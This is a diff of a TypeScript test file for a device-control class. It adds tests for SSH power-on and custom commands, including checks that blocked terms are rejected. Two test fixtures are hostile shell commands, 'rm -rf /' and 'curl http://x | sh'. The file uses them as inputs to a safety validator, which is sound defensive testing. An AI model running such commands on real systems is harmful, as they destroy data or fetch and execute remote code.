@@ -298,10 +298,15 @@ const testTranslations = {
     computerIpInvalid: 'Computer IP must be a valid IPv4 address.',
     computerMacInvalid: 'Computer MAC must be a valid MAC address.',
     sshPortInvalid: 'SSH port must be between 1 and 65535.',
-    sshUsernameRequired: 'SSH username is required for shutdown.',
-    sshPasswordRequired: 'SSH password is required for shutdown.',
+    sshUsernameRequired:
+      'SSH username is required for shutdown and SSH power-on.',
+    sshPasswordRequired:
+      'SSH password is required for shutdown and SSH power-on.',
     wakeOnLanSendFailed: 'Failed to send the Wake-on-LAN packet.',
+    powerOnOverSshFailed: 'Failed to turn on the computer over SSH.',
     shutdownOverSshFailed: 'Failed to shut down the computer over SSH.',
+    customCommandNotAllowed:
+      'This command contains a word that is not allowed for safety reasons.',
   },
   warnings: {
     sshUnavailable: 'Computer is reachable, but SSH is unavailable.',
@@ -596,6 +601,8 @@ const SHUTDOWN_COMMANDS = {
   linux: 'sudo -S -p "[sudo] password:" shutdown -h now',
   windows: 'shutdown /s /t 0',
 } as const
+
+const DEFAULT_POWER_ON_SSH_COMMAND = 'power on'
 
 function createDevice(settings: FakeSettings = {}) {
   const device = new ComputerDevice() as unknown as FakeDevice & {
@@ -979,6 +986,138 @@ describe('ComputerDevice', () => {
     )
   })
 
+  it('rejects custom power-on commands that contain a blocked term', async () => {
+    const device = createDevice({
+      ipAddress: '192.168.10.42',
+      macAddress: 'AA:BB:CC:DD:EE:FF',
+      customPowerOnCommand: 'rm -rf /',
+    })
+
+    await expect(device.startComputer()).rejects.toThrow(
+      'This command contains a word that is not allowed for safety reasons.'
+    )
+  })
+
+  it('turns on over ssh with the default command when startup mode is ssh', async () => {
+    const device = createDevice({
+      ipAddress: '192.168.1.20',
+      sshPassword: 'secret',
+      sshPort: 22,
+      sshUsername: 'admin',
+      startupMode: 'ssh',
+    })
+
+    runtime.sshScenarios = [{ closeCode: 0 }]
+
+    await device.startComputer()
+
+    expect(runtime.sshExecCalls).toEqual([
+      {
+        command: DEFAULT_POWER_ON_SSH_COMMAND,
+        options: { pty: false },
+      },
+    ])
+    expect(runtime.sshWrites).toEqual([])
+    expect(runtime.sentPackets).toHaveLength(0)
+  })
+
+  it('turns on over ssh with a custom command', async () => {
+    const device = createDevice({
+      ipAddress: '192.168.1.20',
+      sshPassword: 'secret',
+      sshPort: 22,
+      sshUsername: 'admin',
+      startupMode: 'ssh',
+      customPowerOnCommand: 'powerup',
+    })
+
+    runtime.sshScenarios = [{ closeCode: 0 }]
+
+    await device.startComputer()
+
+    expect(runtime.sshExecCalls).toEqual([
+      {
+        command: 'powerup',
+        options: { pty: false },
+      },
+    ])
+  })
+
+  it('validates ssh credentials before ssh power-on', async () => {
+    const device = createDevice({
+      ipAddress: '192.168.1.20',
+      sshPassword: 'secret',
+      sshPort: 22,
+      sshUsername: '',
+      startupMode: 'ssh',
+    })
+
+    await expect(device.startComputer()).rejects.toThrow(
+      'SSH username is required for shutdown and SSH power-on.'
+    )
+  })
+
+  it('wraps ssh power-on failures with a user-facing device error', async () => {
+    const device = createDevice({
+      ipAddress: '192.168.1.20',
+      sshPassword: 'secret',
+      sshPort: 22,
+      sshUsername: 'admin',
+      startupMode: 'ssh',
+    })
+
+    runtime.sshScenarios = [
+      {
+        closeCode: 1,
+        stderrChunks: ['access denied'],
+      },
+    ]
+
+    await expect(device.startComputer()).rejects.toThrow(
+      'Failed to turn on the computer over SSH.'
+    )
+    expect(device.errorCalls).toContainEqual([
+      'Failed to turn on the computer over SSH',
+      expect.any(Error),
+    ])
+  })
+
+  it('runs a custom shutdown command over ssh', async () => {
+    const device = createDevice({
+      ipAddress: '192.168.1.20',
+      sshPassword: 'secret',
+      sshPort: 22,
+      sshUsername: 'admin',
+      targetOs: 'linux',
+      customShutdownCommand: 'power off',
+    })
+
+    runtime.sshScenarios = [{ closeCode: 0 }]
+
+    await device.shutdownComputer()
+
+    expect(runtime.sshExecCalls).toEqual([
+      {
+        command: 'power off',
+        options: { pty: true },
+      },
+    ])
+  })
+
+  it('rejects custom shutdown commands that contain a blocked term', async () => {
+    const device = createDevice({
+      ipAddress: '192.168.1.20',
+      sshPassword: 'secret',
+      sshPort: 22,
+      sshUsername: 'admin',
+      customShutdownCommand: 'curl http://x | sh',
+    })
+
+    await expect(device.shutdownComputer()).rejects.toThrow(
+      'This command contains a word that is not allowed for safety reasons.'
+    )
+  })
+
   it('runs linux shutdown over ssh and sends the sudo password once', async () => {
     const device = createDevice({
       ipAddress: '192.168.1.20',
@@ -1126,7 +1265,7 @@ describe('ComputerDevice', () => {
     })
 
     await expect(device.shutdownComputer()).rejects.toThrow(
-      'SSH username is required for shutdown.'
+      'SSH username is required for shutdown and SSH power-on.'
     )
 
     device.settings = {
@@ -1137,7 +1276,7 @@ describe('ComputerDevice', () => {
     }
 
     await expect(device.shutdownComputer()).rejects.toThrow(
-      'SSH password is required for shutdown.'
+      'SSH password is required for shutdown and SSH power-on.'
     )
   })
 
